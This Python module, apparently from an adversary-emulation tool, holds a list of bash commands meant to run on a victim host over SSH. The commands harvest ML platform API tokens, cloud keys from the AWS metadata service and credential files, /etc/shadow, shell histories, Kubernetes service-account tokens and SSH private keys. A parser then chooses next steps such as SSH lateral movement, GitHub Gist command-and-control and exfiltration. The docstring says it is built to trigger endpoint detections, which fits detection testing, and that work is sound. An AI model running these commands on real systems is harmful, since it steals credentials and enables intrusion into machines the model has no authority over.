"""
Environment & Credential Harvesting (T1552.007, T1082)

Bash commands targeting ML/AI platform credentials specifically:
HuggingFace tokens, cloud provider keys, kubeconfig, SSH keys, .env files.

Noisy by design — generates Falcon IOAs on T1552, T1087, T1083, T1071.
"""

# Commands executed on victim via SSH
HARVEST_COMMANDS = [
    # --- System context ---
    "echo '=== SYSTEM ==='",
    "uname -a; hostname; whoami; id",
    "echo '=== PROCESSES ==='",
    "ps aux | grep -iE 'python|jupyter|mlflow|airflow|kubeflow|ray|prefect' | grep -v grep",

    # --- ML/AI platform tokens (T1552.007) ---
    "echo '=== ML TOKENS ==='",
    "env | grep -iE 'HF_TOKEN|HUGGING|HUGGINGFACE|WANDB|COMET|NEPTUNE|MLFLOW|DATABRICKS|OPENAI_API|ANTHROPIC|REPLICATE|TOGETHER'",
    "cat ~/.huggingface/token 2>/dev/null && echo '[HF] found ~/.huggingface/token'",
    "cat ~/.netrc 2>/dev/null | grep -A2 'huggingface\\|wandb\\|comet'",
    "find / -name '.env' -maxdepth 5 -readable 2>/dev/null | xargs grep -l 'TOKEN\\|KEY\\|SECRET' 2>/dev/null | head -5",

    # --- AWS metadata service — T1552.007 / Cloud IOA trigger ---
    "echo '=== AWS METADATA ==='",
    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/ 2>/dev/null && echo '[AWS] metadata reachable'",
    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null",
    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/dynamic/instance-identity/document 2>/dev/null",
    "curl -sf --connect-timeout 3 http://169.254.169.254/latest/user-data 2>/dev/null",

    # --- Cloud provider credentials (T1552.007) ---
    "echo '=== CLOUD CREDS ==='",
    "env | grep -iE 'AWS_ACCESS|AWS_SECRET|AWS_SESSION|AZURE_CLIENT|GOOGLE_APPLICATION|GCP_|CLOUDSDK'",
    "cat ~/.aws/credentials 2>/dev/null",
    "cat ~/.aws/config 2>/dev/null",
    "find / -name 'credentials.json' -maxdepth 6 -readable 2>/dev/null | head -3",
    "cat ~/.config/gcloud/application_default_credentials.json 2>/dev/null",

    # --- Shadow & local user enumeration (T1087.001) ---
    "echo '=== LOCAL USERS ==='",
    "cat /etc/passwd 2>/dev/null",
    "cat /etc/shadow 2>/dev/null && echo '[SHADOW] readable'",
    "cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'",
    "last -n 20 2>/dev/null",

    # --- Shell history — credentials in plaintext (T1552.003) ---
    "echo '=== SHELL HISTORY ==='",
    "cat ~/.bash_history 2>/dev/null | grep -iE 'token|key|secret|password|aws|curl|wget' | tail -30",
    "cat ~/.zsh_history 2>/dev/null | grep -iE 'token|key|secret|password|aws|curl|wget' | tail -30",
    "cat /root/.bash_history 2>/dev/null | tail -20",

    # --- Kubernetes (T1613) ---
    "echo '=== KUBERNETES ==='",
    "cat ~/.kube/config 2>/dev/null",
    "ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
    "cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null && echo '[K8S] SA token found'",
    "kubectl get pods --all-namespaces 2>/dev/null | head -20",
    "kubectl config current-context 2>/dev/null",

    # --- SSH keys (T1145) ---
    "echo '=== SSH KEYS ==='",
    "ls -la ~/.ssh/ 2>/dev/null",
    "cat ~/.ssh/id_rsa 2>/dev/null | head -5 && echo '[SSH] id_rsa found'",
    "cat ~/.ssh/id_ed25519 2>/dev/null | head -5 && echo '[SSH] id_ed25519 found'",
    "cat ~/.ssh/known_hosts 2>/dev/null | head -10",

    # --- Pipeline / orchestration config ---
    "echo '=== PIPELINE CONFIG ==='",
    "find /etc /opt /srv /home -name '*.yaml' -o -name '*.yml' -o -name '*.json' 2>/dev/null | "
    "xargs grep -l 'password\\|token\\|secret\\|api_key' 2>/dev/null | head -5",
    "find / -name 'airflow.cfg' -o -name 'mlflow.env' -maxdepth 8 2>/dev/null | head -3",
]


def parse_available_vectors(harvest_output: str) -> list[str]:
    """
    Parse harvest output and return list of available escalation vectors.
    Used by DecisionNode to choose next technique.
    """
    vectors = []

    if any(x in harvest_output for x in ["kubeconfig", "SA token found", "kubectl"]):
        vectors.append("k8s_enum")

    if any(x in harvest_output for x in ["AWS_ACCESS", "aws_secret", "[HF] found"]):
        vectors.append("cloud_api_enum")

    if any(x in harvest_output for x in ["id_rsa found", "id_ed25519 found"]):
        vectors.append("ssh_lateral")

    # GitHub Gist C2 always available if victim has internet
    vectors.append("gist_c2")

    # Exfil always last option
    vectors.append("exfil")

    return vectors
